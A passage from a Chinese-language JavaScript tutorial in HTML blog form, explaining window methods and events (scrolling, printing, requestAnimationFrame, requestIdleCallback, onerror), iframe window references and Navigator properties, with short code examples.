<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.scrollTo(x-coord, y-coord)</span><br></pre></td></tr></table></figure>

<p>它也可以接受一个配置对象作为参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.scrollTo(options)</span><br></pre></td></tr></table></figure>

<p>配置对象<code>options</code>有三个属性。</p>
<ul>
<li><code>top</code>：滚动后页面左上角的垂直坐标，即 y 坐标。</li>
<li><code>left</code>：滚动后页面左上角的水平坐标，即 x 坐标。</li>
<li><code>behavior</code>：字符串，表示滚动的方式，有三个可能值（<code>smooth</code>、<code>instant</code>、<code>auto</code>），默认值为<code>auto</code>。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">window.scrollTo(&#123;</span><br><span class="line">  top: 1000,</span><br><span class="line">  behavior: &#39;smooth&#39;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>window.scroll()</code>方法是<code>window.scrollTo()</code>方法的别名。</p>
<p><code>window.scrollBy()</code>方法用于将网页滚动指定距离（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.scrollBy(0, window.innerHeight)</span><br></pre></td></tr></table></figure>

<p>上面代码用于将网页向下滚动一屏。</p>
<p>如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。</p>
<ul>
<li>Element.scrollTop</li>
<li>Element.scrollLeft</li>
<li>Element.scrollIntoView()</li>
</ul>
<h4 id="window-print"><a href="#window-print" class="headerlink" title="window.print()"></a>window.print()</h4><p><code>window.print</code>方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。</p>
<p>常见的打印按钮代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&#39;printLink&#39;).onclick &#x3D; function () &#123;</span><br><span class="line">  window.print();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (typeof window.print &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123;</span><br><span class="line">  &#x2F;&#x2F; 支持打印功能</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="window-focus-，window-blur"><a href="#window-focus-，window-blur" class="headerlink" title="window.focus()，window.blur()"></a>window.focus()，window.blur()</h4><p><code>window.focus()</code>方法会激活窗口，使其获得焦点，出现在其他窗口的前面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var popup &#x3D; window.open(&#39;popup.html&#39;, &#39;Popup Window&#39;);</span><br><span class="line"></span><br><span class="line">if ((popup !&#x3D;&#x3D; null) &amp;&amp; !popup.closed) &#123;</span><br><span class="line">  popup.focus();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码先检查<code>popup</code>窗口是否依然存在，确认后激活该窗口。</p>
<p><code>window.blur()</code>方法将焦点从窗口移除。</p>
<p>当前窗口获得焦点时，会触发<code>focus</code>事件；当前窗口失去焦点时，会触发<code>blur</code>事件。</p>
<h4 id="window-getSelection"><a href="#window-getSelection" class="headerlink" title="window.getSelection()"></a>window.getSelection()</h4><p><code>window.getSelection</code>方法返回一个<code>Selection</code>对象，表示用户现在选中的文本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var selObj &#x3D; window.getSelection();</span><br></pre></td></tr></table></figure>

<p>使用<code>Selection</code>对象的<code>toString</code>方法可以得到选中的文本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var selectedText &#x3D; selObj.toString();</span><br></pre></td></tr></table></figure>

<h4 id="window-getComputedStyle-，window-matchMedia"><a href="#window-getComputedStyle-，window-matchMedia" class="headerlink" title="window.getComputedStyle()，window.matchMedia()"></a>window.getComputedStyle()，window.matchMedia()</h4><p><code>window.getComputedStyle()</code>方法接受一个元素节点作为参数，返回一个包含该元素的最终样式信息的对象，详见《CSS 操作》一章。</p>
<p><code>window.matchMedia()</code>方法用来检查 CSS 的<code>mediaQuery</code>语句，详见《CSS 操作》一章。</p>
<h4 id="window-requestAnimationFrame"><a href="#window-requestAnimationFrame" class="headerlink" title="window.requestAnimationFrame()"></a>window.requestAnimationFrame()</h4><p><code>window.requestAnimationFrame()</code>方法跟<code>setTimeout</code>类似，都是推迟某个函数的执行。不同之处在于，<code>setTimeout</code>必须指定推迟的时间，<code>window.requestAnimationFrame()</code>则是推迟到浏览器下一次重流时执行，执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时，<code>requestAnimationFrame()</code>会暂停执行。</p>
<p>如果某个函数会改变网页的布局，一般就放在<code>window.requestAnimationFrame()</code>里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。</p>
<p>该方法接受一个回调函数作为参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.requestAnimationFrame(callback)</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>callback</code>是一个回调函数。<code>callback</code>执行时，它的参数就是系统传入的一个高精度时间戳（<code>performance.now()</code>的返回值），单位是毫秒，表示距离网页加载的时间。</p>
<p><code>window.requestAnimationFrame()</code>的返回值是一个整数，这个整数可以传入<code>window.cancelAnimationFrame()</code>，用来取消回调函数的执行。</p>
<p>下面是一个<code>window.requestAnimationFrame()</code>执行网页动画的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var element &#x3D; document.getElementById(&#39;animate&#39;);</span><br><span class="line">element.style.position &#x3D; &#39;absolute&#39;;</span><br><span class="line"></span><br><span class="line">var start &#x3D; null;</span><br><span class="line"></span><br><span class="line">function step(timestamp) &#123;</span><br><span class="line">  if (!start) start &#x3D; timestamp;</span><br><span class="line">  var progress &#x3D; timestamp - start;</span><br><span class="line">  &#x2F;&#x2F; 元素不断向左移，最大不超过200像素</span><br><span class="line">  element.style.left &#x3D; Math.min(progress &#x2F; 10, 200) + &#39;px&#39;;</span><br><span class="line">  &#x2F;&#x2F; 如果距离第一次执行不超过 2000 毫秒，</span><br><span class="line">  &#x2F;&#x2F; 就继续执行动画</span><br><span class="line">  if (progress &lt; 2000) &#123;</span><br><span class="line">    window.requestAnimationFrame(step);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">window.requestAnimationFrame(step);</span><br></pre></td></tr></table></figure>

<p>上面代码定义了一个网页动画，持续时间是2秒，会让元素向右移动。</p>
<h4 id="window-requestIdleCallback"><a href="#window-requestIdleCallback" class="headerlink" title="window.requestIdleCallback()"></a>window.requestIdleCallback()</h4><p><code>window.requestIdleCallback()</code>跟<code>setTimeout</code>类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用<code>window.requestIdleCallback()</code>将其推迟执行，以保证网页性能。</p>
<p>它跟<code>window.requestAnimationFrame()</code>的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；<code>window.requestIdleCallback()</code>可以保证回调函数在系统资源空闲时执行。</p>
<p>该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空闲，都会执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.requestIdleCallback(callback[, options])</span><br></pre></td></tr></table></figure>

<p><code>callback</code>参数是一个回调函数。该回调函数执行时，系统会传入一个<code>IdleDeadline</code>对象作为参数。<code>IdleDeadline</code>对象有一个<code>didTimeout</code>属性（布尔值，表示是否为超时调用）和一个<code>timeRemaining()</code>方法（返回该空闲时段剩余的毫秒数）。</p>
<p><code>options</code>参数是一个配置对象，目前只有<code>timeout</code>一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。</p>
<p><code>window.requestIdleCallback()</code>方法返回一个整数。该整数可以传入<code>window.cancelIdleCallback()</code>取消回调函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">requestIdleCallback(myNonEssentialWork);</span><br><span class="line"></span><br><span class="line">function myNonEssentialWork(deadline) &#123;</span><br><span class="line">  while (deadline.timeRemaining() &gt; 0) &#123;</span><br><span class="line">    doWorkIfNeeded();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>requestIdleCallback()</code>用来执行非关键任务<code>myNonEssentialWork</code>。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。</p>
<p>下面是指定<code>timeout</code>的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestIdleCallback(processPendingAnalyticsEvents, &#123; timeout: 2000 &#125;);</span><br></pre></td></tr></table></figure>

<p>上面代码指定，<code>processPendingAnalyticsEvents</code>必须在未来2秒之内执行。</p>
<p>如果由于超时导致回调函数执行，则<code>deadline.timeRemaining()</code>返回<code>0</code>，<code>deadline.didTimeout</code>返回<code>true</code>。</p>
<p>如果多次执行<code>window.requestIdleCallback()</code>，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。</p>
<h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p><code>window</code>对象可以接收以下事件。</p>
<h4 id="load-事件和-onload-属性"><a href="#load-事件和-onload-属性" class="headerlink" title="load 事件和 onload 属性"></a>load 事件和 onload 属性</h4><p><code>load</code>事件发生在文档在浏览器窗口加载完毕时。<code>window.onload</code>属性可以指定这个事件的回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">window.onload &#x3D; function() &#123;</span><br><span class="line">  var elements &#x3D; document.getElementsByClassName(&#39;example&#39;);</span><br><span class="line">  for (var i &#x3D; 0; i &lt; elements.length; i++) &#123;</span><br><span class="line">    var elt &#x3D; elements[i];</span><br><span class="line">    &#x2F;&#x2F; ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码在网页加载完毕后，获取指定元素并进行处理。</p>
<h4 id="error-事件和-onerror-属性"><a href="#error-事件和-onerror-属性" class="headerlink" title="error 事件和 onerror 属性"></a>error 事件和 onerror 属性</h4><p>浏览器脚本发生错误时，会触发<code>window</code>对象的<code>error</code>事件。我们可以通过<code>window.onerror</code>属性对该事件指定回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.onerror &#x3D; function (message, filename, lineno, colno, error) &#123;</span><br><span class="line">  console.log(&quot;出错了！--&gt; %s&quot;, error.stack);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>由于历史原因，<code>window</code>的<code>error</code>事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。</p>
<ul>
<li>出错信息</li>
<li>出错脚本的网址</li>
<li>行号</li>
<li>列号</li>
<li>错误对象</li>
</ul>
<p>老式浏览器只支持前三个参数。</p>
<p>并不是所有的错误，都会触发 JavaScript 的<code>error</code>事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。</p>
<p>下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.onerror &#x3D; function(msg, url, line) &#123;</span><br><span class="line">  if (onerror.num++ &gt; onerror.max) &#123;</span><br><span class="line">    alert(&#39;ERROR: &#39; + msg + &#39;\n&#39; + url + &#39;:&#39; + line);</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">onerror.max &#x3D; 3;</span><br><span class="line">onerror.num &#x3D; 0;</span><br></pre></td></tr></table></figure>

<p>需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置<code>Access-Control-Allow-Origin</code>的 HTTP 头信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>

<p>然后，在网页的<code>&lt; script&gt;</code>标签中设置<code>crossorigin</code>属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script crossorigin&#x3D;&quot;anonymous&quot; src&#x3D;&quot;&#x2F;&#x2F;example.com&#x2F;file.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>上面代码的<code>crossorigin=&quot;anonymous&quot;</code>表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为<code>crossorigin=&quot;use-credentials&quot;</code>，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息<code>Access-Control-Allow-Credentials</code>。</p>
<h4 id="window-对象的事件监听属性"><a href="#window-对象的事件监听属性" class="headerlink" title="window 对象的事件监听属性"></a>window 对象的事件监听属性</h4><p>除了具备元素节点都有的 GlobalEventHandlers 接口，<code>window</code>对象还具有以下的事件监听函数属性。</p>
<ul>
<li><code>window.onafterprint</code>：<code>afterprint</code>事件的监听函数。</li>
<li><code>window.onbeforeprint</code>：<code>beforeprint</code>事件的监听函数。</li>
<li><code>window.onbeforeunload</code>：<code>beforeunload</code>事件的监听函数。</li>
<li><code>window.onhashchange</code>：<code>hashchange</code>事件的监听函数。</li>
<li><code>window.onlanguagechange</code>: <code>languagechange</code>的监听函数。</li>
<li><code>window.onmessage</code>：<code>message</code>事件的监听函数。</li>
<li><code>window.onmessageerror</code>：<code>MessageError</code>事件的监听函数。</li>
<li><code>window.onoffline</code>：<code>offline</code>事件的监听函数。</li>
<li><code>window.ononline</code>：<code>online</code>事件的监听函数。</li>
<li><code>window.onpagehide</code>：<code>pagehide</code>事件的监听函数。</li>
<li><code>window.onpageshow</code>：<code>pageshow</code>事件的监听函数。</li>
<li><code>window.onpopstate</code>：<code>popstate</code>事件的监听函数。</li>
<li><code>window.onstorage</code>：<code>storage</code>事件的监听函数。</li>
<li><code>window.onunhandledrejection</code>：未处理的 Promise 对象的<code>reject</code>事件的监听函数。</li>
<li><code>window.onunload</code>：<code>unload</code>事件的监听函数。</li>
</ul>
<h3 id="多窗口操作"><a href="#多窗口操作" class="headerlink" title="多窗口操作"></a>多窗口操作</h3><p>由于网页可以使用<code>iframe</code>元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。</p>
<h4 id="窗口的引用"><a href="#窗口的引用" class="headerlink" title="窗口的引用"></a>窗口的引用</h4><p>各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。</p>
<ul>
<li><code>top</code>：顶层窗口，即最上层的那个窗口</li>
<li><code>parent</code>：父窗口</li>
<li><code>self</code>：当前窗口，即自身</li>
</ul>
<p>下面代码可以判断，当前窗口是否为顶层窗口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (window.top &#x3D;&#x3D;&#x3D; window.self) &#123;</span><br><span class="line">  &#x2F;&#x2F; 当前窗口是顶层窗口</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; 当前窗口是子窗口</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面的代码让父窗口的访问历史后退一次。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.parent.history.back();</span><br></pre></td></tr></table></figure>

<p>与这些变量对应，浏览器还提供一些特殊的窗口名，供<code>window.open()</code>方法、<code>&lt; a&gt;</code>标签、<code>&lt; form&gt;</code>标签等引用。</p>
<ul>
<li><code>_top</code>：顶层窗口</li>
<li><code>_parent</code>：父窗口</li>
<li><code>_blank</code>：新窗口</li>
</ul>
<p>下面代码就表示在顶层窗口打开链接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;somepage.html&quot; target&#x3D;&quot;_top&quot;&gt;Link&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>

<h4 id="iframe-元素"><a href="#iframe-元素" class="headerlink" title="iframe 元素"></a>iframe 元素</h4><p>对于<code>iframe</code>嵌入的窗口，<code>document.getElementById</code>方法可以拿到该窗口的 DOM 节点，然后使用<code>contentWindow</code>属性获得<code>iframe</code>节点包含的<code>window</code>对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var frame &#x3D; document.getElementById(&#39;theFrame&#39;);</span><br><span class="line">var frameWindow &#x3D; frame.contentWindow;</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>frame.contentWindow</code>可以拿到子窗口的<code>window</code>对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 获取子窗口的标题</span><br><span class="line">frameWindow.title</span><br></pre></td></tr></table></figure>

<p>&lt; iframe&gt;元素的contentDocument属性，可以拿到子窗口的document对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var frame &#x3D; document.getElementById(&#39;theFrame&#39;);</span><br><span class="line">var frameDoc &#x3D; frame.contentDocument;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 等同于</span><br><span class="line">var frameDoc &#x3D; frame.contentWindow.document;</span><br></pre></td></tr></table></figure>

<p>&lt; iframe&gt;元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用window.postMessage方法。</p>
<p>&lt; iframe&gt;窗口内部，使用window.parent引用父窗口。如果当前页面没有父窗口，则window.parent属性返回自身。因此，可以通过window.parent是否等于window.self，判断当前窗口是否为iframe窗口。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (window.parent !&#x3D;&#x3D; window.self) &#123;</span><br><span class="line">  &#x2F;&#x2F; 当前窗口是子窗口</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&lt; iframe&gt;窗口的window对象，有一个frameElement属性，返回&lt; iframe&gt;在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于null。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var f1Element &#x3D; document.getElementById(&#39;f1&#39;);</span><br><span class="line">var f1Window &#x3D; f1Element.contentWindow;</span><br><span class="line"></span><br><span class="line">f1Window.frameElement &#x3D;&#x3D;&#x3D; f1Element &#x2F;&#x2F; true</span><br><span class="line">window.frameElement &#x3D;&#x3D;&#x3D; null &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<h4 id="window-frames-属性"><a href="#window-frames-属性" class="headerlink" title="window.frames 属性"></a>window.frames 属性</h4><p><code>window.frames</code>属性返回一个类似数组的对象，成员是所有子窗口的<code>window</code>对象。可以使用这个属性，实现窗口之间的互相引用。比如，<code>frames[0]</code>返回第一个子窗口，<code>frames[1].frames[2]</code>返回第二个子窗口内部的第三个子窗口，<code>parent.frames[1]</code>返回父窗口的第二个子窗口。</p>
<p>注意，<code>window.frames</code>每个成员的值，是框架内的窗口（即框架的<code>window</code>对象），而不是<code>iframe</code>标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用<code>window.frames[0].document</code>的写法。</p>
<p>另外，如果<code>&lt;iframe&gt;</code>元素设置了<code>name</code>或<code>id</code>属性，那么属性值会自动成为全局变量，并且可以通过<code>window.frames</code>属性引用，返回子窗口的<code>window</code>对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; HTML 代码为 &lt;iframe id&#x3D;&quot;myFrame&quot;&gt;</span><br><span class="line">window.myFrame &#x2F;&#x2F; [HTMLIFrameElement]</span><br><span class="line">frames.myframe &#x3D;&#x3D;&#x3D; myFrame &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>另外，<code>name</code>属性的值会自动成为子窗口的名称，可以用在<code>window.open</code>方法的第二个参数，或者<code>&lt;a&gt;</code>和<code>&lt;frame&gt;</code>标签的<code>target</code>属性。</p>
<h2 id="Navigator-对象，Screen-对象。"><a href="#Navigator-对象，Screen-对象。" class="headerlink" title="Navigator 对象，Screen 对象。"></a>Navigator 对象，Screen 对象。</h2><p><code>window.navigator</code>属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。</p>
<h3 id="Navigator-对象的属性"><a href="#Navigator-对象的属性" class="headerlink" title="Navigator 对象的属性"></a>Navigator 对象的属性</h3><h4 id="Navigator-userAgent"><a href="#Navigator-userAgent" class="headerlink" title="Navigator.userAgent"></a>Navigator.userAgent</h4><p><code>navigator.userAgent</code>属性返回浏览器的 User Agent 字符串，表示用户设备信息，包含了浏览器的厂商、版本、操作系统等信息。</p>
<p>下面是 Chrome 浏览器的<code>userAgent</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">navigator.userAgent</span><br><span class="line">&#x2F;&#x2F; &quot;Mozilla&#x2F;5.0 (X11; Linux x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;29.0.1547.57 Safari&#x2F;537.36&quot;</span><br></pre></td></tr></table></figure>

<p>通过<code>userAgent</code>属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。</p>
<p>不过，通过<code>userAgent</code>可以大致准确地识别手机浏览器，方法就是测试是否包含<code>mobi</code>字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var ua &#x3D; navigator.userAgent.toLowerCase();</span><br><span class="line"></span><br><span class="line">if (&#x2F;mobi&#x2F;.test(ua)) &#123;</span><br><span class="line">  &#x2F;&#x2F; 手机浏览器</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  &#x2F;&#x2F; 非手机浏览器</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;mobi|android|touch|mini&#x2F;.test(ua)</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-plugins"><a href="#Navigator-plugins" class="headerlink" title="Navigator.plugins"></a>Navigator.plugins</h4><p><code>Navigator.plugins</code>属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var pluginsLength &#x3D; navigator.plugins.length;</span><br><span class="line"></span><br><span class="line">for (var i &#x3D; 0; i &lt; pluginsLength; i++) &#123;</span><br><span class="line">  console.log(navigator.plugins[i].name);</span><br><span class="line">  console.log(navigator.plugins[i].filename);</span><br><span class="line">  console.log(navigator.plugins[i].description);</span><br><span class="line">  console.log(navigator.plugins[i].version);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-platform"><a href="#Navigator-platform" class="headerlink" title="Navigator.platform"></a>Navigator.platform</h4><p><code>Navigator.platform</code>属性返回用户的操作系统信息，比如<code>MacIntel</code>、<code>Win32</code>、<code>Linux x86_64</code>等 。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">navigator.platform</span><br><span class="line">&#x2F;&#x2F; &quot;Linux x86_64&quot;</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-onLine"><a href="#Navigator-onLine" class="headerlink" title="Navigator.onLine"></a>Navigator.onLine</h4><p><code>navigator.onLine</code>属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.onLine &#x2F;&#x2F; true</span><br></pre></td></tr></table></figure>

<p>有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的<code>onLine</code>属性会返回<code>true</code>，所以不能假定只要是<code>true</code>，用户就一定能访问互联网。不过，如果是<code>false</code>，可以断定用户一定离线。</p>
<p>用户变成在线会触发<code>online</code>事件，变成离线会触发<code>offline</code>事件，可以通过<code>window.ononline</code>和<code>window.onoffline</code>指定这两个事件的回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#39;offline&#39;, function(e) &#123; console.log(&#39;offline&#39;); &#125;);</span><br><span class="line">window.addEventListener(&#39;online&#39;, function(e) &#123; console.log(&#39;online&#39;); &#125;);</span><br></pre></td></tr></table></figure>

<h4 id="Navigator-language，Navigator-languages"><a href="#Navigator-language，Navigator-languages" class="headerlink" title="Navigator.language，Navigator.languages"></a>Navigator.language，Navigator.languages</h4><p><code>Navigator.language</code>属性返回一个字符串，表示浏览器的首选语言。该属性只读。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.language &#x2F;&#x2F; &quot;en&quot;</span><br></pre></td></tr></table></figure>

<p><code>Navigator.languages</code>属性返回一个数组，表示用户可以接受的语言。<code>Navigator.language</code>总是这个数组的第一个成员。HTTP 请求头信息的<code>Accept-Language</code>字段，就来自这个数组。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">navigator.languages  &#x2F;&#x2F; [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</span><br></pre></td></tr></table></figure>

<p>如果这个属性发生变化，就会在<code>window</code>对象上触发<code>languagechange</code>事件。</p>
